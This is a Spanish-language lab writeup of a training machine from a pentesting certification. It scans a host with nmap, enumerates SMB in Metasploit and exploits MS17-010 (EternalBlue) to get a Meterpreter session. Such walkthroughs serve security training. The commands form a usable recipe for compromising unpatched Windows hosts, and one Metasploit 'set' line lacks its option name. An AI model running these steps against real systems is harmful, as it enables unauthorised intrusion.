---
title: Eternal Writeup - Pentester Mentor Junior (PMJ)
date: 2026-06-19
categories: [Writeup, PMJ]
tags: [Writeup, Windows, PMJ]
image: /assets/img/commons/EternalWriteup/eternal_banner.png
---

# Introducción

En esta ocasión estaré resolviendo la máquina **Eternal**, una máquina Windows de dificultad fácil perteneciente a la certificación **Pentester Mentor Junior (PMJ)** de la academia **Hacker Mentor**.  
  
El objetivo de este laboratorio es identificar una vulnerabilidad crítica en SMB y explotarla para obtener acceso remoto al sistema objetivo.  
  
---

# Reconocimiento

Una vista del login de la maquina

![login_principal](/assets/img/commons/EternalWriteup/login_principal.jpeg)

El primer paso fue verificar que la máquina objetivo estuviera activa dentro de la red.

```
ping 192.168.100.81
```

La respuesta confirmó que la máquina se encontraba disponible para continuar con las siguientes fases.

![ping_maquina](/assets/img/commons/EternalWriteup/ping_maquina.png)

# Escaneo

Realicé un escaneo utilizando Nmap para identificar puertos abiertos y posibles vulnerabilidades.

```
sudo nmap -sV --script vuln -v --min-rate 6000 -p- -oA archivo_escaner 192.168.100.81
```
Donde:
- `sudo` - Ejecuta Nmap con privilegios de administrador para permitir ciertos tipos de escaneo.
- `-sV` - Detecta la versión de los servicios encontrados.
- `--script vuln` - Ejecuta los scripts de la categoría vuln del NSE para identificar vulnerabilidades conocidas.
- `-v` - Muestra información detallada durante el escaneo.
- `--min-rate 6000` - Envía al menos 6000 paquetes por segundo para acelerar el escaneo.
- `-p-` - Escanea los 65535 puertos TCP.
- `-oA archivo_escaner` - Guarda el resultado en formatos `.nmap`, `.xml` y `.gnmap`.

Durante el escaneo se detectó que el puerto **445/TCP** estaba abierto, correspondiente al servicio **SMB**.

Además, el script **vuln** indicó que el sistema era vulnerable a **MS17-010 (EternalBlue)**, convirtiéndose en el principal vector de ataque para las siguientes fases.

![escaneo_nmap](/assets/img/commons/EternalWriteup/escaneo_nmap.png)

# Enumeración

Para validar la información obtenida utilicé Metasploit.

```
msfconsole
```

Busqué un módulo que permitiera identificar la versión exacta del servicio:

```
search smb version
```

Seleccioné el módulo correspondiente:

```
use auxiliary/scanner/smb/smb_version
set 192.168.100.81
run
```

**La enumeración confirmó información relevante sobre el servicio SMB.**

![escaner_version](/assets/img/commons/EternalWriteup/escaner_version.png)

Posteriormente busqué información adicional sobre la vulnerabilidad.

```
searchsploit ms17-010
```

Los resultados mostraron distintos exploits públicos relacionados con EternalBlue.

![busqueda_exploit](/assets/img/commons/EternalWriteup/busqueda_exploit.png)

---

# Explotación

Con la vulnerabilidad identificada procedí a utilizar el módulo EternalBlue de Metasploit.

Busqué todos los módulos relacionados con la vulnerabilidad MS17-010.

```
search ms17-010
```

Use el exploit EternalBlue para preparar la explotación.

```
use exploit/windows/smb/ms17_010_eternalblue
```

```
set RHOSTS 192.168.100.81
```

Una vez configurado el exploit, ejecuté la explotación.

```
run
```

![run_exploit](/assets/img/commons/EternalWriteup/run_exploit.png)

Tras unos segundos se obtuvo una sesión Meterpreter sobre la máquina objetivo. Mostramos el usuario con el que se ejecuta la sesión Meterpreter.

```
getuid
```

Obtenemos información del sistema operativo comprometido, incluyendo versión, arquitectura y nombre del equipo.

```
sysinfo
```

La salida confirmó que el sistema había sido comprometido exitosamente.

![comandos_dentro](/assets/img/commons/EternalWriteup/comandos_dentro.png)

Incluso podemos ver con el comando `help` la lista de comandos que tenemos disponibles para ejecutar dentro de la pagina, entre los que se destacan comandos de tipo:

- Comandos básicos
- Comandos para obtener privilegios elevados
- Comandos para la base de datos de contraseñas
- Comandos para manipular la fecha y la hora
- Comandos del sistema de archivos
- Comandos de red
- Comandos del sistema
- Comandos de la interfaz de usuario
- Comandos de la cámara web
- Comandos de salida de audio

**Y ya teniendo disponibles los comandos de esas categorías es como se da por completada esta maquina virtual.**

---

Gracias por leer este writeup.
